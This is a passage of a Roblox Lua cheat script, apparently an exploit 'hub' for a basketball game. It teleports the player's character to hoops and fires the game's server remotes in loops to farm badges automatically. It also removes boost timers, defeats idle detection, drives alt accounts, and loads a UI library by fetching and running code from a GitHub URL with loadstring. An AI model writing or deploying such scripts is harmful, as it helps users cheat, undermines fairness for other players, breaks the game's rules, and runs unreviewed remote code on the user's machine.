        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = workspace.Courts.Court_2._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenInsideCourt1()
    -- Variables
    -- Variables
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-26)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(hoop.Position - Vector3.new(-20))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = workspace.Courts.Court_1._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function RecAutoInsideCourt3()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_3"]["_Hoop1"].Goal.CFrame - Vector3.new(-25)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_3"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        teleportToThree()
        wait(0.1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function RecAutoInsideCourt1()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-25)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        teleportToThree()
        wait(0.1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function RecAutoInsideCourt2()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal.CFrame - Vector3.new(-25)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        teleportToThree()
        wait(0.1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function RecAutoInsideCourt4()
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_4"]["_Hoop1"].Goal.CFrame - Vector3.new(-25)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function shootTheThree()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_4"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.6)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end

    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        teleportToThree()
        wait(0.1)
        shootTheThree()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoPostCourt1()
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local function postup()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Post", {true, Vector3.new(0, 0, 0)})
    end
    wait(3)
    local function posttp()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-5)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end
    local function shoot()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.8)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        posttp()
        wait(1)
        postup()
        shoot()
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoPostCourt2()
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local function postup()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Post", {true, Vector3.new(0, 0, 0)})
    end
    wait(3)
    local function posttp()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"].Goal.CFrame - Vector3.new(-5)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end
    local function shoot()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0, 0, 0),
                    ["Hoop"] = game:GetService("Workspace").Courts["Court_2"]["_Hoop1"],
                    ["Ball"] = game.workspace.Basketball
                }
            }
        )
        wait(0.8)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        posttp()
        wait(1)
        postup()
        shoot()
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenAcroCourt1()
    -- Variables
    -- Variables
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-25)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(hoop.Position - Vector3.new(-20))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(0.101140499, 0, 0.994872153),
                    ["Hoop"] = workspace.Courts.Court_1._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.67)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        wait(1)
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

local function AutoAdrenTearCourt1()
    -- Variables
    -- Variables
    local phum = game.Players.LocalPlayer.Character.Humanoid
    local phrp = game.Players.LocalPlayer.Character.PrimaryPart
    local hoop = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal
    local maxdist = 30
    local root = game.Players.LocalPlayer.Character.PrimaryPart
    local humanoid = game.Players.LocalPlayer.Character.Humanoid
    -- Functions
    local function teleportToThree()
        Speed = getgenv().TweenSpeed
        local tween =
            game:GetService("TweenService"):Create(
            game.Players.LocalPlayer.Character.HumanoidRootPart,
            TweenInfo.new(Speed),
            {
                CFrame = game:GetService("Workspace").Courts["Court_1"]["_Hoop1"].Goal.CFrame - Vector3.new(-25)
            }
        )
        tween:Play()
        tween.Completed:Wait()
    end

    local function useAdren()
        repeat
            wait()
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", true)
        until game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170

        if game.Players.LocalPlayer.Character.Pad.Stamina.Bar.AbsoluteRotation > 170 then
            print("Stamina Used.")
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Sprinting", false)
            phrp.Anchored = false
        end
    end

    local function MoveToTwo()
        phum:MoveTo(hoop.Position - Vector3.new(-20))
        phum.MoveToFinished:Wait()
        phrp.Anchored = true
    end

    local function shootTheMid()
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
            "Shoot",
            {
                true,
                {
                    ["Vel"] = Vector3.new(-0.998346686, 0, -0.0574793182),
                    ["Hoop"] = workspace.Courts.Court_1._Hoop1,
                    ["Ball"] = workspace.Basketball
                }
            }
        )
        wait(0.48)
        game:GetService("ReplicatedStorage").Remotes.Action:FireServer("Shoot", {false})
    end
    -- Repeat every function
    repeat
        local ifPickedUpBall = game.Players.LocalPlayer.Character:WaitForChild("ball.weld")
        wait(1)
        teleportToThree()
        wait(1)
        MoveToTwo()
        useAdren()
        shootTheMid()
        wait(3)
    until game.Players.LocalPlayer.Values.InGame.Value == false
end

--[Functions]--

--[Library]--
local Library = loadstring(game:HttpGet(("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua")))()
--[Library]--

--[Tabs]--
local Window = Library.CreateLib("v1.9", getgenv().Theme)
local tabAdren = Window:NewTab("Adrenaline")
local tabReg = Window:NewTab("Regular Badges")
local tabRec = Window:NewTab("Rec Center")
local tabExtras = Window:NewTab("Extra Stuff")
local tabAlt = Window:NewTab("Alts")
local tabCredit = Window:NewTab("Credits")

--[Tabs]--

--[Give Buttons]--
local giveCredits = tabCredit:NewSection("Credits")
local giveAdren = tabAdren:NewSection("Adrenaline Badges")
local giveReg = tabReg:NewSection("Regular Badges")
local giveExtra = tabExtras:NewSection("Extras")
local giveAlt = tabAlt:NewSection("Alt Shit")
local giveRec = tabRec:NewSection("Rec Center")
--[Give Buttons]--

--[Credits]--
giveCredits:NewButton("Who Helped me script", "Shrek#4412, nitro#2184")
giveCredits:NewButton("Who Owns the Hub", "Pradda#7777, XZ#2385")
--[Credits]--

--[Adren Tab]--
giveAdren:NewButton(
    "Adrenaline Sharp",
    "Sharp + Adren = Adren Sharp",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            AutoAdrenSharpCourt1()
        elseif court == 2 then
            AutoAdrenSharpCourt2()
        end
    end
)
giveAdren:NewButton(
    "Adrenaline Close Shot",
    "Close Shot + Adren = Adren Close Shot",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            AutoAdrenCloseShotCourt1()
        elseif court == 2 then
            AutoAdrenCloseShotCourt2()
        end
    end
)
giveAdren:NewButton(
    "Adrenaline Inside",
    "Adren + Inside = Adren Inside",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            AutoAdrenInsideCourt1()
        elseif court == 2 then
            AutoAdrenInsideCourt2()
        end
    end
)
giveAdren:NewButton(
    "Adrenaline Acro",
    "Acro + Aden = Adren Acro",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            AutoAdrenAcroCourt1()
        elseif court == 2 then
            AutoAdrenAcroCourt2()
        end
    end
)
giveAdren:NewButton(
    "Adrenaline Tear",
    "Tear + Adren = Adren Tear",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            AutoAdrenTearCourt1()
        elseif cout == 2 then
            AutoAdrenTearCourt2()
        end
    end
)
--[Adren Tab]--
--[Regular Badges Tab 1]--
giveReg:NewButton(
    "Acro",
    "Auto Acro grind",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value

        if court == 1 then
            AutoAcroCourt1()
        elseif court == 2 then
            AutoAcroCourt2()
        end
    end
)
giveReg:NewButton(
    "Sharp",
    "Auto Sharp grind",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            AutoSharpCourt1()
        elseif court == 2 then
            AutoSharpCourt2()
        end
    end
)
giveReg:NewButton(
    "Tear",
    "Auto Tear grind",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value

        if court == 1 then
            AutoTearCourt1()
        elseif court == 2 then
            AutoTearCourt2()
        end
    end
)
giveReg:NewButton(
    "Inside",
    "Auto Inside grind",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            AutoInsideCourt1()
        elseif court == 2 then
            AutoInsideCourt2()
        end
    end
)
giveReg:NewButton(
    "Post Shot",
    "Post shot grind",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            AutoPostCourt1()
        elseif court == 2 then
            AutoPostCourt2()
        end
    end
)
--[Regular Badges Tab 1]--
--[Extras]--
giveExtra:NewSlider(
    "FOV",
    "Change Field Of View",
    120,
    70,
    function(value)
        local old = workspace.CurrentCamera.FieldOfView
        min = math.floor(workspace.CurrentCamera.FieldOfView) -- Min :u
        max = 120 --MAx
        flag = "fov"
        workspace.CurrentCamera.FieldOfView = value
    end
)

giveExtra:NewToggle(
    "Anti Afk",
    "Use this so you can click off tab",
    function(state)
        if state then
            local vu = game:GetService("VirtualUser")
            game:GetService("Players").LocalPlayer.Idled:connect(
                function()
                    vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                    wait(1)
                    vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                    print("Anti AFK On")
                end
            )
        else
            print("false")
        end
    end
)
giveExtra:NewToggle(
    "Auto Equip Badges",
    "Auto Equips Badges",
    function(state)
        if state then
            local Badges = {
                "Sharpshooter",
                "Dimer",
                "Acrobat",
                "Break Starter",
                "Inside Specialist",
                "Tear Dropper",
                "Bullet Pass",
                "Post-Shot Specialist",
                "Adrenaline"
            }

            game.Players.LocalPlayer.Values.InGame:GetPropertyChangedSignal("Value"):Connect(
                function()
                    for _, v in next, Badges do
                        game:GetService("ReplicatedStorage").GameRemotes.DataCommands:InvokeServer("Equip Boost", v)
                        print("Equipped " .. v)
                    end
                end
            )
        else
            print("false")
        end
    end
)
giveExtra:NewButton(
    "Grind Break Starter",
    "You need to complete one break starter",
    function()
        game.Players.LocalPlayer.Character.ActiveBoosts.ChildAdded:Connect(
            function(child)
                game.Players.LocalPlayer.Character.ActiveBoosts:WaitForChild("Start Break Starter").AutoRemove:Destroy()
                game.Players.LocalPlayer.Character.ActiveBoosts:WaitForChild("Break Starter").AutoRemove:Destroy()
                child:FindFirstChild("AutoRemove"):Destroy()
                print(
                    "Break Starter Grinding. BTW You must complete one break starter action for the whole thing to work"
                )
            end
        )
    end
)
giveExtra:NewButton(
    "Grind Quick Shot",
    "You need to complete one Quick Shot",
    function()
        game.Players.LocalPlayer.Character.ActiveBoosts.ChildAdded:Connect(
            function(child)
                game.Players.LocalPlayer.Character.ActiveBoosts:WaitForChild("Quick Shot").AutoRemove:Destroy()
                game.Players.LocalPlayer.Character.ActiveBoosts:WaitForChild("Quick Shot").AutoRemove:Destroy()
                child:FindFirstChild("AutoRemove"):Destroy()
                print("Quick Shot Grinding. BTW You must complete one quick shot action for the whole thing to work")
            end
        )
    end
)
giveExtra:NewButton(
    "Grind Second Chance",
    "You need to complete one Second Chance",
    function()
        game.Players.LocalPlayer.Character.ActiveBoosts.ChildAdded:Connect(
            function(child)
                game.Players.LocalPlayer.Character.ActiveBoosts:WaitForChild("Second Chance").AutoRemove:Destroy()
                game.Players.LocalPlayer.Character.ActiveBoosts:WaitForChild("Second Chance").AutoRemove:Destroy()
                child:FindFirstChild("AutoRemove"):Destroy()
                print(
                    "Second Chance Grinding. BTW You must complete one second chance action for the whole thing to work"
                )
            end
        )
    end
)
giveExtra:NewButton(
    "Grind Break Starter",
    "You need to complete one break starter",
    function()
        game.Players.LocalPlayer.Character.ActiveBoosts.ChildAdded:Connect(
            function(child)
                game.Players.LocalPlayer.Character.ActiveBoosts:WaitForChild("Start Break Starter").AutoRemove:Destroy()
                game.Players.LocalPlayer.Character.ActiveBoosts:WaitForChild("Break Starter").AutoRemove:Destroy()
                child:FindFirstChild("AutoRemove"):Destroy()
                print(
                    "Break Starter Grinding. BTW You must complete one break starter action for the whole thing to work"
                )
            end
        )
    end
)
--[Extras]--

--[Alt Shit]--
giveAlt:NewTextBox(
    "Auto Pass",
    "Put the Username of the person you want to pass to",
    function(txt)
        _G.Teammate = txt
        print(_G.Teammate)
        game.Players.LocalPlayer.Character.ChildAdded:Connect(
            function(child)
                if child.Name == "ball.weld" then
                    repeat
                        wait()
                        local A_1 = "Pass"
                        local A_2 = {
                            ["Char"] = game.Players.LocalPlayer.Character,
                            ["Alley"] = false,
                            ["Pass"] = true,
                            ["PassTo"] = _G.Teammate
                        }
                        local Event = game:GetService("ReplicatedStorage").Remotes.Action
                        Event:FireServer(A_1, A_2)
                        wait()
                        local A_1 = "Pass"
                        local A_2 = {
                            ["Pass"] = false
                        }
                        local Event = game:GetService("ReplicatedStorage").Remotes.Action
                        Event:FireServer(A_1, A_2)
                    until not game.Players.LocalPlayer.Character:FindFirstChild("ball.weld")
                end
            end
        )
    end
)

giveAlt:NewTextBox(
    "Auto Tricky Pass",
    "Put the Username of the person you want to pass to",
    function(txt)
        _G.Teammate = txt
        print(_G.Teammate)
        game.Players.LocalPlayer.Character.ChildAdded:Connect(
            function(child)
                if child.Name == "ball.weld" then
                    game:GetService("ReplicatedStorage").Remotes.Action:FireServer(
                        "Shoot",
                        {
                            true,
                            {
                                ["Vel"] = Vector3.new(0, 0, 0),
                                ["Hoop"] = game:GetService("Workspace").Courts["Court_3"]["_Hoop1"],
                                ["Ball"] = game.workspace.Basketball
                            }
                        }
                    )
                    wait(0.3)
                    repeat
                        wait()
                        local A_1 = "Pass"
                        local A_2 = {
                            ["Char"] = game.Players.LocalPlayer.Character,
                            ["Alley"] = false,
                            ["Pass"] = true,
                            ["PassTo"] = _G.Teammate
                        }
                        local Event = game:GetService("ReplicatedStorage").Remotes.Action
                        Event:FireServer(A_1, A_2)
                        wait()
                        local A_1 = "Pass"
                        local A_2 = {
                            ["Pass"] = false
                        }
                        local Event = game:GetService("ReplicatedStorage").Remotes.Action
                        Event:FireServer(A_1, A_2)
                    until not game.Players.LocalPlayer.Character:FindFirstChild("ball.weld")
                end
            end
        )
    end
)

giveAlt:NewTextBox(
    "Tp Away",
    "Put the alt you want to tp away user",
    function(txt)
        plr = game.Players.LocalPlayer
        if plr.Name == txt then
            while true do
                wait(1)
                Speed = getgenv().TweenSpeed
                local tween =
                    game:GetService("TweenService"):Create(
                    game.Players.LocalPlayer.Character.HumanoidRootPart,
                    TweenInfo.new(Speed),
                    {
                        CFrame = CFrame.new(-163.270004, 4.57776642, -0.379999995)
                    }
                )
                tween:Play()
                tween.Completed:Wait()
            end
        end
    end
)

giveAlt:NewButton(
    "Tp To Court 1",
    "Teleports to court 1 team 2 spot",
    function()
        while not game:IsLoaded() do
            wait(2)
        end
        while wait(1) do
            game:GetService("ReplicatedStorage").GameRemotes.ParkCommands:InvokeServer(
                "Join Court",
                {["Team"] = "2", ["Court"] = "1"}
            )
        end
    end
)

giveAlt:NewButton(
    "Tp To Court 2",
    "Teleports to court 1 team 2 spot",
    function()
        while not game:IsLoaded() do
            wait(2)
        end
        while wait(1) do
            game:GetService("ReplicatedStorage").GameRemotes.ParkCommands:InvokeServer(
                "Join Court",
                {["Team"] = "2", ["Court"] = "2"}
            )
        end
    end
)

--[Alt Shit]--

--[Rec]--
giveRec:NewButton(
    "Rec Sharp",
    "Auto sharp in rec center",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            RecAutoSharpCourt1()
        elseif court == 2 then
            RecAutoSharpCourt2()
        elseif court == 3 then
            RecAutoSharpCourt3()
        elseif court == 4 then
            RecAutoSharpCourt4()
        end
    end
)

giveRec:NewButton(
    "Rec Inside",
    "Auto inside in rec center",
    function()
        court = game.Players.LocalPlayer.Values.OnCourt.Value
        if court == 1 then
            RecAutoInsideCourt1()
        elseif court == 2 then
            RecAutoInsideCourt2()
        elseif court == 3 then
            RecAutoInsideCourt3()
        elseif court == 4 then
            RecAutoInsideCourt4()
        end
    end
)
--[Rec]--
